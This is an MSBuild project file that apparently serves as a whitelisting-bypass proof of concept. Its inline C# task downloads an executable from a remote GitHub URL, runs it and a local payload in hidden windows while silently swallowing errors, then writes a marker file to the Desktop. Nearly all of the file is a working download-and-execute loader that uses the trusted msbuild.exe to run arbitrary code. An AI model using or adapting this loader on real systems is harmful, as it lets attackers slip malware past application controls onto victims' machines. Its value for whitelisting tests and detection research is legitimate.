<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- This inline task executes c# code. -->
  <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildBypass.csproj -->
  <!-- Feel free to use a more aggressive class for testing. -->
  <Target Name="Hello">
   <ClassExample/>
  </Target>
	<UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
	<Task>
	<!-- <Reference Include="System.IO" /> Example Include -->
      <Code Type="Class" Language="cs">
        <![CDATA[
			using System;
			using System.IO;
			using System.Net;
			using System.Text;
			using Microsoft.Build.Framework;
			using Microsoft.Build.Utilities;
			public class ClassExample :  Task, ITask
			{
				public override bool Execute()
				{
					string remoteUri = "https://raw.githubusercontent.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/master/Payload/MsbuildBypass/MsBuildOnlinePayload.exe";
					string fileName = "MsBuildOnlinePayloadDownloaded.exe", myStringWebResource = null;
					// Create a new WebClient instance.
					WebClient myWebClient = new WebClient();
					// Concatenate the domain with the Web resource filename.
					myStringWebResource = remoteUri + fileName;
					try{
						// Download the Web resource and save it into the current filesystem folder.
						myWebClient.DownloadFile(myStringWebResource,fileName);
						System.Diagnostics.Process process = new System.Diagnostics.Process();
					}catch{
					}
					System.Diagnostics.Process processA = new System.Diagnostics.Process();
					System.Diagnostics.ProcessStartInfo startInfoA = new System.Diagnostics.ProcessStartInfo();
					startInfoA.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
					startInfoA.FileName = "MsBuildOnlinePayloadDownloaded.exe";
					processA.StartInfo = startInfoA;
					try{
						processA.Start();
					}catch{
					}
					
					System.Diagnostics.Process processB = new System.Diagnostics.Process();
					System.Diagnostics.ProcessStartInfo startInfoB = new System.Diagnostics.ProcessStartInfo();
					startInfoB.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
					startInfoB.FileName = "MsBuildOfflinePayload.exe";
					processB.StartInfo = startInfoB;
					try{
						processB.Start();
					}catch{
					}
					
					string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
					string filename = "/WLtester.txt";
					path += filename;
					using (FileStream file = File.Exists(path) ? File.Open(path, FileMode.Append) : File.Open(path, FileMode.CreateNew)) {
						using (StreamWriter stream = new StreamWriter(file)) {
							stream.WriteLine("MsBuildBypass.");
						}
					}
					return true;				
				}
			}
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>